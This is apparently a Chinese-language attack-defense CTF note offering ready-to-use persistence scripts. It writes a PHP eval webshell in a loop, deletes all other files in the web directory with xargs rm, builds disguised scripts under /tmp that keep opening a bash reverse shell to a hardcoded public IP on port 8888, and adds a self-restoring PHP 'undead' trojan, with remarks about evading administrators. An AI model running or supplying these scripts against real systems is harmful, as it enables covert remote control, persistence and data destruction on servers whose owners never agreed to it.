---
####分析
```
1. 上传自己 webshell (内存木马)
2. 根据内存木马生成的 webshell 将 shell 反弹到公网ip
3. 在反弹的 shell 中执行
------------------------------------------------
while :
do
#############################
# 自动写 webshell
#############################
WEBSHELL=sniperoj.php
echo '<?php eval($_POST[c])?>' > ${WEBSHELL}
#############################
# 批量删 webshell
#############################
find . | grep -v "^\./${WEBSHELL}$" | xargs
##############################
sleep 0.05
done
------------------------------------------------
# 自动反弹 shell
#############################
 rm -rf /tmp/ssh_tmp_00.sh
 echo '#!/bin/sh' >> /tmp/ssh_tmp_00.sh
 echo '' >> /tmp/ssh_tmp_00.sh
 echo 'function run(){' >> /tmp/ssh_tmp_00.sh
 echo '    netstat -an | grep ":8888" | grep ESTABLISHED > /dev/null' >> /tmp/ssh_tmp_00.sh
 echo '    if [ $? -ne 0 ]' >> /tmp/ssh_tmp_00.sh
 echo '    then' >> /tmp/ssh_tmp_00.sh
 echo '        bash -c "sh -i >&/dev/tcp/120.24.215.80/8888 0>&1"' >> /tmp/ssh_tmp_00.sh
 echo '    fi' >> /tmp/ssh_tmp_00.sh
 echo '}' >> /tmp/ssh_tmp_00.sh
 echo '' >> /tmp/ssh_tmp_00.sh
 echo 'while :' >> /tmp/ssh_tmp_00.sh
 echo 'do' >> /tmp/ssh_tmp_00.sh
 echo '    date' >> /tmp/ssh_tmp_00.sh
 echo '    sleep 3' >> /tmp/ssh_tmp_00.sh
 echo '    run' >> /tmp/ssh_tmp_00.sh
 echo 'done' >> /tmp/ssh_tmp_00.sh
 chmod +x /tmp/ssh_tmp_00.sh
 bash -x /tmp/ssh_tmp_00.sh
------------------------------------------------
这样就会每隔 50 毫秒自动创建自己的 webshell
然后自动删除别的 webshell
```
---
####不死强删敌方shell
把上面的脚本再整理一下, 更容易直接使用的版本如下 :
```
1. 获取一个普通 webshell
2. 提权成内存 webshell
3. 利用内存 webshell 生成的 webshell 反弹 shell
4. 在反弹的 shell 中执行 , 即可得到一个基于 bash 的伪不死 shell , 只要管理员不发现即可
### I. 注意修改 /var/www/html/ 为具有写权限的目录
### II. 注意修改 sleep 时间 , 建议 0.05 即 50 毫秒
### ps :
### 突然想到 , 这里的基于 bash 的 shell 其实是可以和 php 的不死 shell 结合起来
### 互相作为守护进程来运行的 , 等以后有时间再搞搞
 rm -rf /tmp/ssh_log_01.sh
 echo '#!/bin/bash' >> /tmp/ssh_log_01.sh
 echo 'while :' >> /tmp/ssh_log_01.sh
 echo 'do' >> /tmp/ssh_log_01.sh
 echo 'WEBPATH=/var/www/html/uploads/' >> /tmp/ssh_log_01.sh
 echo 'WEBSHELL=sniperoj.php' >> /tmp/ssh_log_01.sh
 echo 'touch ${WEBPATH}${WEBSHELL}' >> /tmp/ssh_log_01.sh
 echo 'echo "<?php eval(\$_POST[c])?>" > ${WEBPATH}${WEBSHELL}' >> /tmp/ssh_log_01.sh
 echo 'find ${WEBPATH} | grep -v "[^\.|\/]/${WEBSHELL}$" | xargs rm > /dev/null' >> /tmp/ssh_log_01.sh
 echo 'sleep 1' >> /tmp/ssh_log_01.sh
 echo 'done' >> /tmp/ssh_log_01.sh
 chmod +x /tmp/ssh_log_01.sh
 cd /tmp
 nohup bash ./ssh_log_01.sh &
```
---
#### php内存木马与 bash 木马相互守护
```
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    $file = 'c.php';
    $code = '<?php eval($_POST[c]);?>';
    while(true) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>
```
